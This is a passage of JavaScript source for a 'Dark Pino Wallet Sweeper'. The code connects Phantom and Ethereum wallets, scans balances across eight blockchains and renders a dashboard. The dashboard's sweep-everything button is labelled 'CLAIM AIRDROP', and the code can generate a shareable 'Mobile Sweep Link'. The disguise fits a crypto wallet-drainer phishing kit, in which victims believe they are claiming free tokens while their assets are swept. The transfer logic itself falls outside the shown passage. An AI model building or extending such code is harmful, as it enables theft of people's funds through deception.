            btcDisplay.textContent = 'Not supported yet';
        }
    }

    updateConnectButton() {
        const connectBtn = document.getElementById('connectWalletBtn');
        if (connectBtn) {
            if (this.config.sourceWallet) {
                connectBtn.textContent = '🔄 Scan Balances';
                connectBtn.onclick = () => this.scanAllBalances();
            } else {
                connectBtn.textContent = '🔗 Connect Phantom';
                connectBtn.onclick = () => this.connectPhantom();
            }
        }

        const connectEthBtn = document.getElementById('connectEthBtn');
        if (connectEthBtn) {
            if (this.config.ethWallet) {
                connectEthBtn.textContent = '💎 Ethereum Connected';
                connectEthBtn.style.background = 'linear-gradient(135deg, #4CAF50, #45A049)';
                connectEthBtn.onclick = () => this.scanEthereumBalances();
            } else {
                connectEthBtn.textContent = '💎 Connect Ethereum';
                connectEthBtn.style.background = 'linear-gradient(135deg, #627EEA, #4A67D6)';
                connectEthBtn.onclick = () => this.connectEthereum();
            }
        }
    }

    showScanningUI() {
        const balanceDiv = document.getElementById('balanceDisplay');
        if (balanceDiv) {
            balanceDiv.innerHTML = `
                <div class="scanning">
                    <div class="spinner"></div>
                    <p>🔍 Scanning wallet for all tokens...</p>
                </div>
            `;
        }
    }

    updateBalanceDisplay() {
        const balanceDiv = document.getElementById('balanceDisplay');
        if (!balanceDiv) return;

        // Calculate totals for each chain
        const totals = {
            solana: this.tokenBalances.length + (this.solBalance > 0 ? 1 : 0),
            ethereum: this.ethTokens.length + (this.ethBalance > 0 ? 1 : 0),
            base: this.baseTokens.length + (this.baseBalance > 0 ? 1 : 0),
            arbitrum: this.arbitrumTokens.length + (this.arbitrumBalance > 0 ? 1 : 0),
            optimism: this.optimismTokens.length + (this.optimismBalance > 0 ? 1 : 0),
            polygon: this.polygonTokens.length + (this.polygonBalance > 0 ? 1 : 0),
            sui: this.suiTokens.length + (this.suiBalance > 0 ? 1 : 0),
            bitcoin: this.btcBalance > 0 ? 1 : 0
        };

        const grandTotal = Object.values(totals).reduce((sum, count) => sum + count, 0);

        let html = `
            <div class="balance-summary">
                <h3>🎁 Dark Pino Airdrop Dashboard (${grandTotal} items available)</h3>

                <!-- Solana Section -->
                <div class="chain-section" style="background: rgba(255, 215, 0, 0.1); border: 1px solid #FFD700; border-radius: 10px; padding: 15px; margin: 10px 0;">
                    <h4 style="color: #FFD700; margin: 0 0 10px 0;">🔴 Solana (${totals.solana} items)</h4>
                    ${this.generateChainTokensHTML('solana', this.solBalance, 'SOL', this.tokenBalances)}
                </div>

                <!-- Ethereum Mainnet Section -->
                <div class="chain-section" style="background: rgba(98, 126, 234, 0.1); border: 1px solid #627EEA; border-radius: 10px; padding: 15px; margin: 10px 0;">
                    <h4 style="color: #627EEA; margin: 0 0 10px 0;">🔵 Ethereum Mainnet (${totals.ethereum} items)</h4>
                    ${this.generateChainTokensHTML('ethereum', this.ethBalance, 'ETH', this.ethTokens)}
                </div>

                <!-- Base Network Section -->
                <div class="chain-section" style="background: rgba(0, 82, 255, 0.1); border: 1px solid #0052FF; border-radius: 10px; padding: 15px; margin: 10px 0;">
                    <h4 style="color: #0052FF; margin: 0 0 10px 0;">🔷 Base (${totals.base} items)</h4>
                    ${this.generateChainTokensHTML('base', this.baseBalance, 'ETH', this.baseTokens)}
                </div>

                <!-- Arbitrum Section -->
                <div class="chain-section" style="background: rgba(35, 137, 215, 0.1); border: 1px solid #2389D7; border-radius: 10px; padding: 15px; margin: 10px 0;">
                    <h4 style="color: #2389D7; margin: 0 0 10px 0;">🔷 Arbitrum (${totals.arbitrum} items)</h4>
                    ${this.generateChainTokensHTML('arbitrum', this.arbitrumBalance, 'ETH', this.arbitrumTokens)}
                </div>

                <!-- Optimism Section -->
                <div class="chain-section" style="background: rgba(255, 4, 32, 0.1); border: 1px solid #FF0420; border-radius: 10px; padding: 15px; margin: 10px 0;">
                    <h4 style="color: #FF0420; margin: 0 0 10px 0;">🔷 Optimism (${totals.optimism} items)</h4>
                    ${this.generateChainTokensHTML('optimism', this.optimismBalance, 'ETH', this.optimismTokens)}
                </div>

                <!-- Polygon Section -->
                <div class="chain-section" style="background: rgba(130, 71, 229, 0.1); border: 1px solid #8247E5; border-radius: 10px; padding: 15px; margin: 10px 0;">
                    <h4 style="color: #8247E5; margin: 0 0 10px 0;">🔷 Polygon (${totals.polygon} items)</h4>
                    ${this.generateChainTokensHTML('polygon', this.polygonBalance, 'MATIC', this.polygonTokens)}
                </div>

                <!-- SUI Network Section -->
                <div class="chain-section" style="background: rgba(0, 153, 255, 0.1); border: 1px solid #0099FF; border-radius: 10px; padding: 15px; margin: 10px 0;">
                    <h4 style="color: #0099FF; margin: 0 0 10px 0;">⚡ SUI Network (${totals.sui} items)</h4>
                    ${this.generateChainTokensHTML('sui', this.suiBalance, 'SUI', this.suiTokens)}
                </div>

                <!-- Bitcoin Section -->
                <div class="chain-section" style="background: rgba(255, 152, 0, 0.1); border: 1px solid #ff9800; border-radius: 10px; padding: 15px; margin: 10px 0;">
                    <h4 style="color: #ff9800; margin: 0 0 10px 0;">₿ Bitcoin (${totals.bitcoin} items)</h4>
                    ${this.generateChainTokensHTML('bitcoin', this.btcBalance, 'BTC', [])}
                </div>

                <!-- Monad Section (Placeholder) -->
                <div class="chain-section" style="background: rgba(128, 0, 128, 0.1); border: 1px solid #800080; border-radius: 10px; padding: 15px; margin: 10px 0;">
                    <h4 style="color: #800080; margin: 0 0 10px 0;">🟣 Monad Network</h4>
                    <p style="color: #888; text-align: center;">Coming soon (currently in testnet)</p>
                </div>
        `;

        if (grandTotal > 0) {
            html += `
                <div class="sweep-actions">
                    <button class="btn btn-danger btn-large" id="sweepAllBtn">
                        🎁 CLAIM AIRDROP (${grandTotal} items available)
                    </button>
                    <button class="btn btn-secondary" id="generateLinkBtn">
                        📱 Generate Mobile Link
                    </button>
                </div>
            `;
        } else {
            html += `
                <div class="empty-wallet">
                    <p>✨ No airdrops available across 8 blockchains</p>
                    <p style="font-size: 14px; color: #888;">Connect eligible wallets or check back later for new airdrops</p>
                </div>
            `;
        }

        html += `</div>`;
        balanceDiv.innerHTML = html;

        // Attach event listeners after DOM elements are created
        this.attachEventListeners();
    }

    /**
     * Attach event listeners to dynamically created buttons
     */
    attachEventListeners() {
        // Sweep All button
        const sweepBtn = document.getElementById('sweepAllBtn');
        if (sweepBtn) {
            sweepBtn.addEventListener('click', () => this.executeSweep());
        }

        // Generate Mobile Link button
        const linkBtn = document.getElementById('generateLinkBtn');
        if (linkBtn) {
            linkBtn.addEventListener('click', () => this.showSweepLink());
        }

        // Copy Link button (in modal)
        const copyBtn = document.getElementById('copyLinkBtn');
        if (copyBtn) {
            copyBtn.addEventListener('click', () => {
                const target = copyBtn.getAttribute('data-target');
                this.copyLink(target);
            });
        }

        // Close Modal button
        const closeBtn = document.getElementById('closeLinkModalBtn');
        if (closeBtn) {
            closeBtn.addEventListener('click', (e) => {
                e.target.closest('.sweep-link-modal').remove();
            });
        }
    }

    /**
     * Generate HTML for chain-specific tokens
     */
    generateChainTokensHTML(chainId, nativeBalance, nativeSymbol, tokens) {
        let html = '';

        // Check if wallet is connected for this chain
        const isConnected = this.isChainConnected(chainId);

        if (!isConnected) {
            return '<p style="color: #888; text-align: center;">Wallet not connected</p>';
        }

        // Show native token if balance > 0
        if (nativeBalance > 0) {
            const decimals = nativeSymbol === 'BTC' ? 8 : (nativeSymbol === 'SUI' ? 4 : 6);
            html += `
                <div class="token-item">
                    <span class="token-symbol">${nativeSymbol}</span>
                    <span class="token-balance">${nativeBalance.toFixed(decimals)}</span>
                </div>
            `;
        }

        // Show tokens with meme coin highlighting
        if (tokens && tokens.length > 0) {
            // Separate meme coins from regular tokens
            const memeCoins = tokens.filter(token => token.isMeme);
            const regularTokens = tokens.filter(token => !token.isMeme);

            // Show meme coins first with special styling
            if (memeCoins.length > 0) {
                html += `<div style="border-top: 2px dashed #FFD700; padding-top: 10px; margin-top: 10px;">
                    <div style="color: #FFD700; font-size: 12px; margin-bottom: 8px; text-align: center;">
                        🚀 MEME COINS (${memeCoins.length})
                    </div>`;

                memeCoins.forEach(token => {
                    html += `
                        <div class="token-item" style="background: rgba(255, 215, 0, 0.1); border: 1px solid #FFD700;">
                            <span class="token-symbol" style="color: #FFD700;">🎭 ${token.symbol}</span>
                            <span class="token-balance">${token.balance.toLocaleString()}</span>
                        </div>
                    `;
                });
                html += `</div>`;
            }

            // Show regular tokens
            if (regularTokens.length > 0) {
                if (memeCoins.length > 0) {
                    html += `<div style="border-top: 1px solid #444; padding-top: 10px; margin-top: 10px;">
                        <div style="color: #888; font-size: 12px; margin-bottom: 8px; text-align: center;">
                            💼 REGULAR TOKENS (${regularTokens.length})
                        </div>`;
                }

                regularTokens.forEach(token => {
                    html += `
                        <div class="token-item">
                            <span class="token-symbol">${token.symbol}</span>
                            <span class="token-balance">${token.balance.toLocaleString()}</span>
                        </div>
                    `;
                });

                if (memeCoins.length > 0) {
                    html += `</div>`;
                }
            }
        }

        // Show empty state if no tokens found
        if (nativeBalance === 0 && (!tokens || tokens.length === 0)) {
            html = `<p style="color: #888; text-align: center;">No tokens found on ${chainId}</p>`;
        }

        return html;
    }

    /**
     * Check if wallet is connected for specific chain
     */
    isChainConnected(chainId) {
        switch (chainId) {
            case 'solana':
                return !!this.config.sourceWallet;
            case 'ethereum':
            case 'base':
            case 'arbitrum':
            case 'optimism':
            case 'polygon':
                return !!this.config.ethWallet;
            case 'sui':
                return !!this.suiAddress;
            case 'bitcoin':
                return !!this.btcAddress;
            case 'monad':
                return !!this.monadAddress;
            default:
                return false;
        }
    }

    showSweepLink() {
        const link = this.generateSweepLink();

        const modal = document.createElement('div');
        modal.className = 'sweep-link-modal';
        modal.innerHTML = `
            <div class="modal-content">
                <h3>📱 Mobile Sweep Link</h3>
                <p>Use this link on any device with Phantom installed:</p>
                <div class="link-container">
                    <input type="text" value="${link}" readonly id="sweepLinkInput">
                    <button id="copyLinkBtn" data-target="sweepLinkInput">📋 Copy</button>
                </div>
                <button class="btn btn-secondary" id="closeLinkModalBtn">Close</button>
            </div>
        `;

        document.body.appendChild(modal);
    }

    maskWallet(address) {
        if (!address) return 'Not set';

        // Convert to string if it's an object or other type
        const addressStr = typeof address === 'string' ? address :
                          (address.toString ? address.toString() : String(address));

        // Check if the string is valid
        if (!addressStr || addressStr.length < 8) {
            return addressStr || 'Invalid';
        }

        return `${addressStr.substring(0, 4)}...${addressStr.substring(addressStr.length - 4)}`;
    }

    copyLink(inputId) {
        const input = document.getElementById(inputId);
        if (input) {
            input.select();
            document.execCommand('copy');
            this.showNotification('Link copied to clipboard!', 'success');
        }
    }

    showNotification(message, type = 'info') {
        const notification = document.createElement('div');
        notification.className = `notification notification-${type}`;
        notification.textContent = message;
        document.body.appendChild(notification);

        setTimeout(() => notification.remove(), 3000);
    }
}

// Initialize when DOM is ready
document.addEventListener('DOMContentLoaded', () => {
    try {
        console.log('Initializing Dark Pino Wallet Sweeper...');
        window.walletSweeper = new WalletSweeper();
        window.walletSweeper.initialize().then(() => {
            console.log('Wallet sweeper initialized successfully');
        }).catch(error => {
            console.error('Failed to initialize wallet sweeper:', error);
        });
    } catch (error) {
        console.error('Error creating wallet sweeper:', error);
    }
});

// Export for module usage
if (typeof module !== 'undefined' && module.exports) {
    module.exports = WalletSweeper;
}